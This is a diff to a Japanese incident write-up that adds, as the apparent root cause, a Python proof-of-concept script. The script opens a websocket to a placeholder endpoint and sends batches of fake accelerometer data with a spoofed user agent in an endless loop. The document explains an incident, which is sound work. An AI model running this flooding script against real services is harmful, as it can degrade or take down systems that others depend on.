@@ -25,7 +25,27 @@ TKYTEL COMMENT S1
 
 3.1. すべての元凶
 
-    ※ここにソースコード載せてもいい？※
+    元凶となったPoCコード
+
+  import time
+  import websocket
+  import json
+  import platform
+
+  PLATFORM = 'python ' + platform.python_version() + ' ' + platform.release()
+  USER_AGENT = 'YURIdroid (' + PLATFORM + ')'
+  YURE_ID = 'yuri' + str(int(time.time()))[1:10]
+  websocket_url = 'wss://unstable.example.com/yure/'
+  ws = websocket.create_connection(websocket_url)
+
+  packet_count = 0
+  while True:
+    buf = []
+    for i in range(30):
+      buf.append({'t': int(time.time() * 1000), 'userAgent': USER_AGENT, 'yureId': YURE_ID, 'x': 0.1, 'y': 0.2, 'z': 0.3})
+    ws.send(json.dumps(buf))
+    packet_count = packet_count + 1
+    print(str(packet_count))
 
 4. 発生した被害
 
